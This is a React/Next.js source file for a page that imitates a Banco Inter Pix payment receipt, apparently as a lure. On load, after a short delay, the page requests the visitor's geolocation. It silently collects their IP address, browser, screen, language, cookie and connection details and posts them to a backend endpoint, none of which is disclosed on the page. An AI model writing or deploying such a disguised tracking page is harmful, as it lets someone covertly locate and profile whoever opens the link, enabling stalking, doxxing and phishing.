// components/Comprovante.js
"use client"; // Marca este como um Client Component

import React, { useEffect } from 'react';
import styles from './comprovante.module.css'; // Importa os estilos CSS Module

// Componente funcional React
const Comprovante = () => {

  // Funções auxiliares (movidas para dentro ou fora do componente, como preferir)
  async function getIpAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      if (!response.ok) {
          console.warn("Não foi possível obter o IP de ipify:", response.status);
          return 'IP não disponível (API)';
      }
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Erro ao buscar IP:", error);
      return 'IP não disponível (Erro)';
    }
  }

  async function sendData(position) {
    const ip = await getIpAddress();
    const latitude = position?.coords?.latitude ?? 'Lat indisponível';
    const longitude = position?.coords?.longitude ?? 'Lon indisponível';
    const userAgent = navigator.userAgent || 'N/A';
    const screenWidth = window.screen?.width ?? 'N/A'; // Adicionado optional chaining
    const screenHeight = window.screen?.height ?? 'N/A';// Adicionado optional chaining
    const language = navigator.language || 'N/A';
    const cookies = document.cookie ? 'Disponível (Leitura JS)' : 'Indisponível/HttpOnly';
    const connection = navigator.connection ? {
      type: navigator.connection.type || 'N/A',
      downlink: navigator.connection.downlink || 'N/A'
    } : 'API Conexão Indisponível';

    const dataToSend = {
      latitude, longitude, ip, userAgent, screenWidth,
      screenHeight, language, cookies, connection
    };

    console.log("Enviando dados:", dataToSend);

    // A URL agora aponta para a API route interna do Next.js
    const backendUrl = "/api/send-data";

    try {
      const response = await fetch(backendUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dataToSend)
      });
      console.log("Status da resposta do backend:", response.status);
      if (!response.ok) {
        console.error("Erro ao enviar dados para o backend. Status:", response.status);
        // Você pode querer mostrar um feedback ao usuário aqui, se aplicável
      }
    } catch (error) {
      console.error("Erro de rede ao enviar dados:", error);
    }
  }

  function handleError(error) {
    console.warn(`Erro ao obter geolocalização: ${error.code} - ${error.message}`);
    sendData({ coords: null }); // Tenta enviar sem coords
  }

  // useEffect para rodar o código do lado do cliente após a montagem do componente
  useEffect(() => {
    console.log("Componente Comprovante montado. Agendando solicitação de localização...");
    const timer = setTimeout(() => {
      console.log("Solicitando localização...");
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          sendData,
          handleError,
          { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
        );
      } else {
        console.warn("Geolocalização não é suportada.");
        sendData({ coords: null }); // Tenta enviar sem coords
      }
    }, 2000); // Atraso de 2 segundos

    // Função de limpeza para o useEffect (cancela o timeout se o componente for desmontado)
    return () => clearTimeout(timer);
  }, []); // Array de dependências vazio significa que roda apenas uma vez após a montagem

  // Renderiza o JSX (HTML convertido)
  return (
    <> {/* Fragmento React para agrupar elementos sem div extra */}
      <div className={styles.overlay}></div>
      <div className={styles.document}>
        {/* Cabeçalho */}
        <div className={styles.header}>
          Inter
          <span>Pix enviado <strong>R$ 99,99</strong></span>
        </div>

        {/* Conteúdo do comprovante */}
        <div className={styles.content}>
          {/* Sobre a transação */}
          <div className={styles.sectionTitle}>Sobre a transação</div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Data da transação</div>
            <div className={styles.infoValue}>25/03/2025</div>
          </div>
          {/* ... (restante das infoLines para transação) ... */}
           <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Horário</div>
                <div className={styles.infoValue}>18h58</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Identificador</div>
                <div className={styles.infoValue}>abc123xyz456ficticio</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>ID da transação</div>
                <div className={styles.infoValue}>E0000000000000000000FAKE</div>
            </div>

          {/* Quem pagou */}
          <div className={styles.sectionTitle}>Quem pagou</div>
          {/* ... (infoLines para quem pagou) ... */}
           <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Nome</div>
                <div className={styles.infoValue}>Fulano de Tal</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>CPF/CNPJ</div>
                <div className={styles.infoValue}>***.123.456-**</div>
            </div>
             <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Número da conta</div>
                <div className={styles.infoValue}>00012345-6</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Agência</div>
                <div className={styles.infoValue}>0001</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Instituição</div>
                <div className={styles.infoValue}>BANCO INTER S.A.</div>
            </div>


          {/* Quem recebeu */}
          <div className={styles.sectionTitle}>Quem recebeu</div>
          {/* ... (infoLines para quem recebeu) ... */}
          <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Nome</div>
                <div className={styles.infoValue}>Loja Exemplo</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>CPF/CNPJ</div>
                <div className={styles.infoValue}>12.345.678/0001-90</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Número da conta</div>
                <div className={styles.infoValue}>4135802-6</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Agência</div>
                <div className={styles.infoValue}>0001</div>
            </div>
            <div className={styles.infoLine}>
                <div className={styles.infoLabel}>Instituição</div>
                <div className={styles.infoValue}>MAGALUPAY</div>
            </div>
        </div>
      </div>
    </>
  );
};

export default Comprovante; // Exporta o componente